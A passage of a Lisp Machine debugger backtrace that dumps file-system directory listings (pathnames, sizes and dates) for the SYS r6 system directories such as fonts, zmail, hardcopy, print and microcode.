"B:>sys>r6>fonts>lgp2.directory.1"> :DIRECTORY T :LENGTH-IN-BLOCKS 1 :NOT-BACKED-UP T :CREATION-DATE 2715317314 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>fonts>nlgp2.directory.1"> :DIRECTORY T :LENGTH-IN-BLOCKS 1 :NOT-BACKED-UP T :CREATION-DATE 2715317319 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>fonts>dmp1.directory.1"> :DIRECTORY T :LENGTH-IN-BLOCKS 1 :NOT-BACKED-UP T :CREATION-DATE 2718304162 :AUTHOR ...)) (("sys" "r6" "examples") (#<LMFS-PATHNAME "B:>sys>r6>examples>smile.bin.5"> :LENGTH-IN-BLOCKS 3 :REFERENCE-DATE 2715310681 :MODIFICATION-DATE 2715310681 :CREATION-DATE 2682020263 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>examples>smile.lisp.24"> :LENGTH-IN-BLOCKS 6 :REFERENCE-DATE 2715310682 :MODIFICATION-DATE 2715310682 :CREATION-DATE 2688760179 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>examples>server-finger.bin.6"> :LENGTH-IN-BLOCKS 2 :REFERENCE-DATE 2715310683 :MODIFICATION-DATE 2715310683 :CREATION-DATE 2700257372 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>examples>server-finger.lisp.6"> :LENGTH-IN-BLOCKS 3 :REFERENCE-DATE 2715310685 :MODIFICATION-DATE 2715310685 :CREATION-DATE 2700249930 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>examples>overlap.bin.7"> :GENERATION-RETENTION-COUNT 5 :LENGTH-IN-BLOCKS 2 :REFERENCE-DATE 2720472250 :MODIFICATION-DATE 2719863383 :CREATION-DATE ...) (#<LMFS-PATHNAME "B:>sys>r6>examples>overlap.lisp.16"> :LENGTH-IN-BLOCKS 3 :REFERENCE-DATE 2719863449 :MODIFICATION-DATE 2715310687 :CREATION-DATE 2688760130 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>examples>mouse-sen.bin.4"> :LENGTH-IN-BLOCKS 2 :REFERENCE-DATE 2715310688 :MODIFICATION-DATE 2715310688 :CREATION-DATE 2682020085 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>examples>mouse-sen.lisp.9"> :LENGTH-IN-BLOCKS 2 :REFERENCE-DATE 2715310689 :MODIFICATION-DATE 2715310689 :CREATION-DATE 2688760132 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>examples>audio-examples.bin.5"> :LENGTH-IN-BLOCKS 3 :REFERENCE-DATE 2715310690 :MODIFICATION-DATE 2715310690 :CREATION-DATE 2665054027 :AUTHOR ...) ...) (("sys" "r6" "zmail") (#<LMFS-PATHNAME "B:>sys>r6>zmail>template-examples.lisp.2"> :LENGTH-IN-BLOCKS 2 :REFERENCE-DATE 2722163021 :MODIFICATION-DATE 2715310718 :CREATION-DATE 2615192148 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>zmail>patch.directory.1"> :DIRECTORY T :LENGTH-IN-BLOCKS 1 :NOT-BACKED-UP T :CREATION-DATE 2715313416 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>zmail>window.lisp.425"> :GENERATION-RETENTION-COUNT 5 :LENGTH-IN-BLOCKS 11 :REFERENCE-DATE 2722163020 :MODIFICATION-DATE 2720108376 :CREATION-DATE ...) (#<LMFS-PATHNAME "B:>sys>r6>zmail>universe.lisp.95"> :GENERATION-RETENTION-COUNT 5 :LENGTH-IN-BLOCKS 10 :REFERENCE-DATE 2722163013 :MODIFICATION-DATE 2720108379 :CREATION-DATE ...) (#<LMFS-PATHNAME "B:>sys>r6>zmail>undo.lisp.14"> :GENERATION-RETENTION-COUNT 5 :LENGTH-IN-BLOCKS 5 :REFERENCE-DATE 2722162994 :MODIFICATION-DATE 2720108380 :CREATION-DATE ...) (#<LMFS-PATHNAME "B:>sys>r6>zmail>top.lisp.715"> :GENERATION-RETENTION-COUNT 5 :LENGTH-IN-BLOCKS 13 :REFERENCE-DATE 2722162993 :MODIFICATION-DATE 2720108382 :CREATION-DATE ...) (#<LMFS-PATHNAME "B:>sys>r6>zmail>template.lisp.110"> :GENERATION-RETENTION-COUNT 5 :LENGTH-IN-BLOCKS 9 :REFERENCE-DATE 2722162985 :MODIFICATION-DATE 2720108385 :CREATION-DATE ...) (#<LMFS-PATHNAME "B:>sys>r6>zmail>template-library.lisp.108"> :GENERATION-RETENTION-COUNT 5 :LENGTH-IN-BLOCKS 6 :REFERENCE-DATE 2722162980 :MODIFICATION-DATE 2720108387 :CREATION-DATE ...) (#<LMFS-PATHNAME "B:>sys>r6>zmail>system.lisp.38"> :GENERATION-RETENTION-COUNT 5 :LENGTH-IN-BLOCKS 2 :REFERENCE-DATE 2722162971 :MODIFICATION-DATE 2720108388 :CREATION-DATE ...) ...) (("sys" "r6" "hardcopy") (#<LMFS-PATHNAME "B:>sys>r6>hardcopy>sysdcl.lisp.22"> :LENGTH-IN-BLOCKS 1 :REFERENCE-DATE 2723442483 :MODIFICATION-DATE 2715311751 :CREATION-DATE 2695486624 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>hardcopy>fontw.lisp.29"> :LENGTH-IN-BLOCKS 6 :REFERENCE-DATE 2718838090 :MODIFICATION-DATE 2715311753 :CREATION-DATE 2683775306 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>hardcopy>press.lisp.51"> :LENGTH-IN-BLOCKS 6 :REFERENCE-DATE 2723442463 :MODIFICATION-DATE 2715311754 :CREATION-DATE 2702056428 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>hardcopy>dpress.lisp.30"> :LENGTH-IN-BLOCKS 5 :REFERENCE-DATE 2723442427 :MODIFICATION-DATE 2715311756 :CREATION-DATE 2677800192 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>hardcopy>defs.lisp.10"> :LENGTH-IN-BLOCKS 2 :REFERENCE-DATE 2723442416 :MODIFICATION-DATE 2715311757 :CREATION-DATE 2669843245 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>hardcopy>press-defs.lisp.6"> :LENGTH-IN-BLOCKS 1 :REFERENCE-DATE 2723442467 :MODIFICATION-DATE 2715311758 :CREATION-DATE 2666058082 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>hardcopy>printer.lisp.42"> :LENGTH-IN-BLOCKS 8 :REFERENCE-DATE 2723599588 :MODIFICATION-DATE 2715311760 :CREATION-DATE 2702390318 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>hardcopy>stream.lisp.210"> :LENGTH-IN-BLOCKS 10 :REFERENCE-DATE 2723442481 :MODIFICATION-DATE 2715311762 :CREATION-DATE 2702253135 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>hardcopy>xgp.lisp.16"> :LENGTH-IN-BLOCKS 2 :REFERENCE-DATE 2723442486 :MODIFICATION-DATE 2715311763 :CREATION-DATE 2697908942 :AUTHOR ...) ...) (("sys" "r6" "print") (#<LMFS-PATHNAME "B:>sys>r6>print>sysdcl.lisp.11"> :LENGTH-IN-BLOCKS 1 :REFERENCE-DATE 2721851361 :MODIFICATION-DATE 2715312135 :CREATION-DATE 2642191502 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>print>sysdcl.bin.1"> :LENGTH-IN-BLOCKS 1 :REFERENCE-DATE 2721851361 :MODIFICATION-DATE 2715312136 :CREATION-DATE 2679342641 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>print>request.lisp.75"> :LENGTH-IN-BLOCKS 6 :REFERENCE-DATE 2721851370 :MODIFICATION-DATE 2715312138 :CREATION-DATE 2699625263 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>print>request.bin.10"> :LENGTH-IN-BLOCKS 4 :REFERENCE-DATE 2721851373 :MODIFICATION-DATE 2715312139 :CREATION-DATE 2676324590 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>print>spooler.lisp.93"> :LENGTH-IN-BLOCKS 7 :REFERENCE-DATE 2721851384 :MODIFICATION-DATE 2715312141 :CREATION-DATE 2699894206 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>print>spooler.bin.9"> :LENGTH-IN-BLOCKS 5 :REFERENCE-DATE 2721851386 :MODIFICATION-DATE 2715312142 :CREATION-DATE 2676324632 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>print>device.lisp.77"> :LENGTH-IN-BLOCKS 4 :REFERENCE-DATE 2721851395 :MODIFICATION-DATE 2715312143 :CREATION-DATE 2702057341 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>print>device.bin.9"> :LENGTH-IN-BLOCKS 3 :REFERENCE-DATE 2721851396 :MODIFICATION-DATE 2715312145 :CREATION-DATE 2676324647 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>print>lgp.lisp.101"> :LENGTH-IN-BLOCKS 3 :REFERENCE-DATE 2721851402 :MODIFICATION-DATE 2715312146 :CREATION-DATE 2697640141 :AUTHOR ...) ...) ...)

TV:COLLECT-FSEDIT-RECURSIVE-WILD-DIRECTORY-NODE:  (P.C. = 44)
   Arg 0 (TV:ROOT-NODE): #<TREE-LIST-TOPNODE 17416500>
   Arg 1 (TV:PATH): #<LOGICAL-PATHNAME "SYS: *; *.*.*">
   Arg 2 (TV:DESCRIPTION): (:ROOT (("LMLib")) (("sys") (("sys" "site")) (("sys" "facilities")) (("sys" "r6") (**) (**) (**) (**) (**) (**) (**) (**) (**) ...)))
   Arg 3 (TV:ALIST): ((("sys" "r6" "doc") (#<LMFS-PATHNAME "B:>sys>r6>doc>zmacs.directory.1"> :DIRECTORY T :LENGTH-IN-BLOCKS 1 :NOT-BACKED-UP T :CREATION-DATE 2715306764 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>doc>doc.lisp.33"> :LENGTH-IN-BLOCKS 3 :REFERENCE-DATE 2715312215 :MODIFICATION-DATE 2715312215 :CREATION-DATE 2700230603 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>doc>sage.directory.1"> :DIRECTORY T :LENGTH-IN-BLOCKS 1 :NOT-BACKED-UP T :CREATION-DATE 2715312216 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>doc>rn6.directory.1"> :DIRECTORY T :LENGTH-IN-BLOCKS 1 :NOT-BACKED-UP T :CREATION-DATE 2715312220 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>doc>rn6-1.directory.1"> :DIRECTORY T :LENGTH-IN-BLOCKS 1 :NOT-BACKED-UP T :CREATION-DATE 2715312237 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>doc>nota.directory.1"> :DIRECTORY T :LENGTH-IN-BLOCKS 1 :NOT-BACKED-UP T :CREATION-DATE 2715312256 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>doc>user.directory.1"> :DIRECTORY T :LENGTH-IN-BLOCKS 1 :NOT-BACKED-UP T :CREATION-DATE 2715312261 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>doc>lms.directory.1"> :DIRECTORY T :LENGTH-IN-BLOCKS 1 :NOT-BACKED-UP T :CREATION-DATE 2715312271 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>doc>ined.directory.1"> :DIRECTORY T :LENGTH-IN-BLOCKS 1 :NOT-BACKED-UP T :CREATION-DATE 2715312277 :AUTHOR ...) ...) (("sys" "r6" "l-fep") (#<LMFS-PATHNAME "B:>sys>r6>l-fep>philips-io4.sync.1"> :LENGTH-IN-BLOCKS 1 :REFERENCE-DATE 2715310033 :MODIFICATION-DATE 2715310033 :CREATION-DATE 2677444385 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>l-fep>philips-io2.sync.1"> :LENGTH-IN-BLOCKS 1 :REFERENCE-DATE 2715310035 :MODIFICATION-DATE 2715310035 :CREATION-DATE 2677444384 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>l-fep>moniterm-io4.sync.4"> :LENGTH-IN-BLOCKS 1 :REFERENCE-DATE 2715310036 :MODIFICATION-DATE 2715310036 :CREATION-DATE 2660167554 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>l-fep>moniterm-io2.sync.4"> :LENGTH-IN-BLOCKS 1 :REFERENCE-DATE 2715310038 :MODIFICATION-DATE 2715310038 :CREATION-DATE 2660168030 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>l-fep>v24-2mw.flod.8"> :LENGTH-IN-BLOCKS 1 :REFERENCE-DATE 2715311776 :MODIFICATION-DATE 2715311776 :CREATION-DATE 2690837251 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>l-fep>v24-debug.flod.1"> :LENGTH-IN-BLOCKS 8 :REFERENCE-DATE 2715311777 :MODIFICATION-DATE 2715311777 :CREATION-DATE 2668185626 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>l-fep>v22-debug.flod.14"> :LENGTH-IN-BLOCKS 8 :REFERENCE-DATE 2715311779 :MODIFICATION-DATE 2715311779 :CREATION-DATE 2659307364 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>l-fep>v18-debug.flod.13"> :LENGTH-IN-BLOCKS 8 :REFERENCE-DATE 2715311781 :MODIFICATION-DATE 2715311781 :CREATION-DATE 2658802390 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>l-fep>v17-debug.flod.13"> :LENGTH-IN-BLOCKS 8 :REFERENCE-DATE 2715311782 :MODIFICATION-DATE 2715311782 :CREATION-DATE 2658802324 :AUTHOR ...) ...) (("sys" "r6" "l-ucode") (#<LMFS-PATHNAME "B:>sys>r6>l-ucode>tmc5-xsq-color-mic.sym.336"> :LENGTH-IN-BLOCKS 67 :REFERENCE-DATE 2715310048 :MODIFICATION-DATE 2715310048 :CREATION-DATE 2706029650 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>l-ucode>tmc5-xsq-color-mic.mic.336"> :LENGTH-IN-BLOCKS 31 :REFERENCE-DATE 2715310052 :MODIFICATION-DATE 2715310052 :CREATION-DATE 2706029573 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>l-ucode>tmc5-xsq-color-mic.err.336"> :LENGTH-IN-BLOCKS 14 :REFERENCE-DATE 2715310056 :MODIFICATION-DATE 2715310056 :CREATION-DATE 2706029662 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>l-ucode>tmc5-io4-xsq-color-mic.sym.336"> :LENGTH-IN-BLOCKS 67 :REFERENCE-DATE 2715310069 :MODIFICATION-DATE 2715310069 :CREATION-DATE 2706030558 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>l-ucode>tmc5-io4-xsq-color-mic.mic.336"> :GENERATION-RETENTION-COUNT 5 :LENGTH-IN-BLOCKS 31 :REFERENCE-DATE 2721163780 :MODIFICATION-DATE 2721163664 :CREATION-DATE ...) (#<LMFS-PATHNAME "B:>sys>r6>l-ucode>tmc5-io4-xsq-color-mic.err.336"> :LENGTH-IN-BLOCKS 14 :REFERENCE-DATE 2715310079 :MODIFICATION-DATE 2715310079 :CREATION-DATE 2706030580 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>l-ucode>tmc5-io4-st506-xsq-color-mic.sym.336"> :LENGTH-IN-BLOCKS 67 :REFERENCE-DATE 2715310094 :MODIFICATION-DATE 2715310094 :CREATION-DATE 2706030956 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>l-ucode>tmc5-io4-st506-xsq-color-mic.mic.336"> :LENGTH-IN-BLOCKS 31 :REFERENCE-DATE 2715310099 :MODIFICATION-DATE 2715310099 :CREATION-DATE 2706030881 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>l-ucode>tmc5-io4-st506-xsq-color-mic.err.336"> :LENGTH-IN-BLOCKS 14 :REFERENCE-DATE 2715310102 :MODIFICATION-DATE 2715310102 :CREATION-DATE 2706030965 :AUTHOR ...) ...) (("sys" "r6" "demo") (#<LMFS-PATHNAME "B:>sys>r6>demo>sysdcl.lisp.8"> :LENGTH-IN-BLOCKS 1 :REFERENCE-DATE 2722517740 :MODIFICATION-DATE 2715310620 :CREATION-DATE 2669904466 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>demo>hakdef.lisp.24"> :LENGTH-IN-BLOCKS 2 :REFERENCE-DATE 2722750507 :MODIFICATION-DATE 2715310621 :CREATION-DATE 2651197246 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>demo>abacus.lisp.21"> :LENGTH-IN-BLOCKS 3 :REFERENCE-DATE 2722517748 :MODIFICATION-DATE 2715310622 :CREATION-DATE 2665771082 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>demo>alarm.lisp.25"> :LENGTH-IN-BLOCKS 4 :REFERENCE-DATE 2722517707 :MODIFICATION-DATE 2715310623 :CREATION-DATE 2659026159 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>demo>crock.lisp.11"> :LENGTH-IN-BLOCKS 3 :REFERENCE-DATE 2723527373 :MODIFICATION-DATE 2715310624 :CREATION-DATE 2678495666 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>demo>dc.lisp.8"> :LENGTH-IN-BLOCKS 3 :REFERENCE-DATE 2722517780 :MODIFICATION-DATE 2715310627 :CREATION-DATE 2665767394 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>demo>deutsc.lisp.36"> :LENGTH-IN-BLOCKS 2 :REFERENCE-DATE 2722517783 :MODIFICATION-DATE 2715310628 :CREATION-DATE 2666102486 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>demo>dlwhak.lisp.44"> :LENGTH-IN-BLOCKS 3 :REFERENCE-DATE 2722517787 :MODIFICATION-DATE 2715310629 :CREATION-DATE 2678839931 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>demo>geb.lisp.37"> :LENGTH-IN-BLOCKS 4 :REFERENCE-DATE 2722517792 :MODIFICATION-DATE 2715310631 :CREATION-DATE 2665767397 :AUTHOR ...) ...) (("sys" "r6" "window") (#<LMFS-PATHNAME "B:>sys>r6>window>keytest.directory.1"> :DIRECTORY T :LENGTH-IN-BLOCKS 1 :NOT-BACKED-UP T :CREATION-DATE 2715310645 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>window>keytest.bin.2"> :LENGTH-IN-BLOCKS 1 :REFERENCE-DATE 2715310678 :MODIFICATION-DATE 2715310678 :CREATION-DATE 2693854259 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>window>keytest.lisp.2"> :LENGTH-IN-BLOCKS 1 :REFERENCE-DATE 2721355323 :MODIFICATION-DATE 2715310679 :CREATION-DATE 2693854201 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>window>tvdefs.lisp.299"> :LENGTH-IN-BLOCKS 8 :REFERENCE-DATE 2723217727 :MODIFICATION-DATE 2715313214 :CREATION-DATE 2695333742 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>window>ltvdef.lisp.26"> :LENGTH-IN-BLOCKS 2 :REFERENCE-DATE 2721355326 :MODIFICATION-DATE 2715313215 :CREATION-DATE 2670634442 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>window>bitblt.lisp.27"> :LENGTH-IN-BLOCKS 5 :REFERENCE-DATE 2721353613 :MODIFICATION-DATE 2715313217 :CREATION-DATE 2705428791 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>window>lscreen.lisp.122"> :LENGTH-IN-BLOCKS 10 :REFERENCE-DATE 2723572526 :MODIFICATION-DATE 2715313219 :CREATION-DATE 2695417117 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>window>scrman.lisp.190"> :LENGTH-IN-BLOCKS 11 :REFERENCE-DATE 2722545156 :MODIFICATION-DATE 2715313220 :CREATION-DATE 2683785409 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>window>sheet.lisp.611"> :LENGTH-IN-BLOCKS 26 :REFERENCE-DATE 2723510182 :MODIFICATION-DATE 2715313224 :CREATION-DATE 2695332143 :AUTHOR ...) ...) (("sys" "r6" "fonts") (#<LMFS-PATHNAME "B:>sys>r6>fonts>tv.directory.1"> :DIRECTORY T :LENGTH-IN-BLOCKS 1 :NOT-BACKED-UP T :CREATION-DATE 2715310648 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>fonts>nlgp1.directory.1"> :DIRECTORY T :LENGTH-IN-BLOCKS 1 :NOT-BACKED-UP T :CREATION-DATE 2715310718 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>fonts>lgp-1.directory.1"> :DIRECTORY T :LENGTH-IN-BLOCKS 1 :NOT-BACKED-UP T :CREATION-DATE 2715311937 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>fonts>lgp2.directory.1"> :DIRECTORY T :LENGTH-IN-BLOCKS 1 :NOT-BACKED-UP T :CREATION-DATE 2715317314 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>fonts>nlgp2.directory.1"> :DIRECTORY T :LENGTH-IN-BLOCKS 1 :NOT-BACKED-UP T :CREATION-DATE 2715317319 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>fonts>dmp1.directory.1"> :DIRECTORY T :LENGTH-IN-BLOCKS 1 :NOT-BACKED-UP T :CREATION-DATE 2718304162 :AUTHOR ...)) (("sys" "r6" "examples") (#<LMFS-PATHNAME "B:>sys>r6>examples>smile.bin.5"> :LENGTH-IN-BLOCKS 3 :REFERENCE-DATE 2715310681 :MODIFICATION-DATE 2715310681 :CREATION-DATE 2682020263 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>examples>smile.lisp.24"> :LENGTH-IN-BLOCKS 6 :REFERENCE-DATE 2715310682 :MODIFICATION-DATE 2715310682 :CREATION-DATE 2688760179 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>examples>server-finger.bin.6"> :LENGTH-IN-BLOCKS 2 :REFERENCE-DATE 2715310683 :MODIFICATION-DATE 2715310683 :CREATION-DATE 2700257372 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>examples>server-finger.lisp.6"> :LENGTH-IN-BLOCKS 3 :REFERENCE-DATE 2715310685 :MODIFICATION-DATE 2715310685 :CREATION-DATE 2700249930 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>examples>overlap.bin.7"> :GENERATION-RETENTION-COUNT 5 :LENGTH-IN-BLOCKS 2 :REFERENCE-DATE 2720472250 :MODIFICATION-DATE 2719863383 :CREATION-DATE ...) (#<LMFS-PATHNAME "B:>sys>r6>examples>overlap.lisp.16"> :LENGTH-IN-BLOCKS 3 :REFERENCE-DATE 2719863449 :MODIFICATION-DATE 2715310687 :CREATION-DATE 2688760130 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>examples>mouse-sen.bin.4"> :LENGTH-IN-BLOCKS 2 :REFERENCE-DATE 2715310688 :MODIFICATION-DATE 2715310688 :CREATION-DATE 2682020085 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>examples>mouse-sen.lisp.9"> :LENGTH-IN-BLOCKS 2 :REFERENCE-DATE 2715310689 :MODIFICATION-DATE 2715310689 :CREATION-DATE 2688760132 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>examples>audio-examples.bin.5"> :LENGTH-IN-BLOCKS 3 :REFERENCE-DATE 2715310690 :MODIFICATION-DATE 2715310690 :CREATION-DATE 2665054027 :AUTHOR ...) ...) (("sys" "r6" "zmail") (#<LMFS-PATHNAME "B:>sys>r6>zmail>template-examples.lisp.2"> :LENGTH-IN-BLOCKS 2 :REFERENCE-DATE 2722163021 :MODIFICATION-DATE 2715310718 :CREATION-DATE 2615192148 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>zmail>patch.directory.1"> :DIRECTORY T :LENGTH-IN-BLOCKS 1 :NOT-BACKED-UP T :CREATION-DATE 2715313416 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>zmail>window.lisp.425"> :GENERATION-RETENTION-COUNT 5 :LENGTH-IN-BLOCKS 11 :REFERENCE-DATE 2722163020 :MODIFICATION-DATE 2720108376 :CREATION-DATE ...) (#<LMFS-PATHNAME "B:>sys>r6>zmail>universe.lisp.95"> :GENERATION-RETENTION-COUNT 5 :LENGTH-IN-BLOCKS 10 :REFERENCE-DATE 2722163013 :MODIFICATION-DATE 2720108379 :CREATION-DATE ...) (#<LMFS-PATHNAME "B:>sys>r6>zmail>undo.lisp.14"> :GENERATION-RETENTION-COUNT 5 :LENGTH-IN-BLOCKS 5 :REFERENCE-DATE 2722162994 :MODIFICATION-DATE 2720108380 :CREATION-DATE ...) (#<LMFS-PATHNAME "B:>sys>r6>zmail>top.lisp.715"> :GENERATION-RETENTION-COUNT 5 :LENGTH-IN-BLOCKS 13 :REFERENCE-DATE 2722162993 :MODIFICATION-DATE 2720108382 :CREATION-DATE ...) (#<LMFS-PATHNAME "B:>sys>r6>zmail>template.lisp.110"> :GENERATION-RETENTION-COUNT 5 :LENGTH-IN-BLOCKS 9 :REFERENCE-DATE 2722162985 :MODIFICATION-DATE 2720108385 :CREATION-DATE ...) (#<LMFS-PATHNAME "B:>sys>r6>zmail>template-library.lisp.108"> :GENERATION-RETENTION-COUNT 5 :LENGTH-IN-BLOCKS 6 :REFERENCE-DATE 2722162980 :MODIFICATION-DATE 2720108387 :CREATION-DATE ...) (#<LMFS-PATHNAME "B:>sys>r6>zmail>system.lisp.38"> :GENERATION-RETENTION-COUNT 5 :LENGTH-IN-BLOCKS 2 :REFERENCE-DATE 2722162971 :MODIFICATION-DATE 2720108388 :CREATION-DATE ...) ...) (("sys" "r6" "hardcopy") (#<LMFS-PATHNAME "B:>sys>r6>hardcopy>sysdcl.lisp.22"> :LENGTH-IN-BLOCKS 1 :REFERENCE-DATE 2723442483 :MODIFICATION-DATE 2715311751 :CREATION-DATE 2695486624 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>hardcopy>fontw.lisp.29"> :LENGTH-IN-BLOCKS 6 :REFERENCE-DATE 2718838090 :MODIFICATION-DATE 2715311753 :CREATION-DATE 2683775306 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>hardcopy>press.lisp.51"> :LENGTH-IN-BLOCKS 6 :REFERENCE-DATE 2723442463 :MODIFICATION-DATE 2715311754 :CREATION-DATE 2702056428 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>hardcopy>dpress.lisp.30"> :LENGTH-IN-BLOCKS 5 :REFERENCE-DATE 2723442427 :MODIFICATION-DATE 2715311756 :CREATION-DATE 2677800192 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>hardcopy>defs.lisp.10"> :LENGTH-IN-BLOCKS 2 :REFERENCE-DATE 2723442416 :MODIFICATION-DATE 2715311757 :CREATION-DATE 2669843245 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>hardcopy>press-defs.lisp.6"> :LENGTH-IN-BLOCKS 1 :REFERENCE-DATE 2723442467 :MODIFICATION-DATE 2715311758 :CREATION-DATE 2666058082 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>hardcopy>printer.lisp.42"> :LENGTH-IN-BLOCKS 8 :REFERENCE-DATE 2723599588 :MODIFICATION-DATE 2715311760 :CREATION-DATE 2702390318 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>hardcopy>stream.lisp.210"> :LENGTH-IN-BLOCKS 10 :REFERENCE-DATE 2723442481 :MODIFICATION-DATE 2715311762 :CREATION-DATE 2702253135 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>hardcopy>xgp.lisp.16"> :LENGTH-IN-BLOCKS 2 :REFERENCE-DATE 2723442486 :MODIFICATION-DATE 2715311763 :CREATION-DATE 2697908942 :AUTHOR ...) ...) (("sys" "r6" "print") (#<LMFS-PATHNAME "B:>sys>r6>print>sysdcl.lisp.11"> :LENGTH-IN-BLOCKS 1 :REFERENCE-DATE 2721851361 :MODIFICATION-DATE 2715312135 :CREATION-DATE 2642191502 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>print>sysdcl.bin.1"> :LENGTH-IN-BLOCKS 1 :REFERENCE-DATE 2721851361 :MODIFICATION-DATE 2715312136 :CREATION-DATE 2679342641 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>print>request.lisp.75"> :LENGTH-IN-BLOCKS 6 :REFERENCE-DATE 2721851370 :MODIFICATION-DATE 2715312138 :CREATION-DATE 2699625263 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>print>request.bin.10"> :LENGTH-IN-BLOCKS 4 :REFERENCE-DATE 2721851373 :MODIFICATION-DATE 2715312139 :CREATION-DATE 2676324590 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>print>spooler.lisp.93"> :LENGTH-IN-BLOCKS 7 :REFERENCE-DATE 2721851384 :MODIFICATION-DATE 2715312141 :CREATION-DATE 2699894206 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>print>spooler.bin.9"> :LENGTH-IN-BLOCKS 5 :REFERENCE-DATE 2721851386 :MODIFICATION-DATE 2715312142 :CREATION-DATE 2676324632 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>print>device.lisp.77"> :LENGTH-IN-BLOCKS 4 :REFERENCE-DATE 2721851395 :MODIFICATION-DATE 